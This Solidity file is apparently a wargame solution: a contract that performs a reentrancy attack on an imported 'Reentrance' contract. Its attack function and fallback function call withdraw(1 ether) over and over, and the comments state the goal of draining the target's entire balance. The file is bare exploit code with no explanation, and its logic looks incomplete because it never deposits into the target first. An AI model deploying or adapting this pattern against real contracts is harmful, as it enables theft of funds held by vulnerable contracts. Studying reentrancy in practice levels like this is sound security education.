// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Reentrance.sol";
contract ReenA {
    Reentrance public ogContract;
    constructor(address payable attack_address)public payable{
        ogContract = Reentrance(attack_address);
        
    }
    
    // initial call to kick things off
    function attack() public {
        if(address(ogContract).balance >= 1 ether) {
            ogContract.withdraw(1 ether);
        }
    }
    
    // when the original contract transfers ether to this contract, it will trigger another withdraw()
    // this will happen until the original contract has 0 ether left.
    fallback() external payable {
        if(address(ogContract).balance >= 1 ether) {
            ogContract.withdraw(1 ether);
        }
    }
    
}
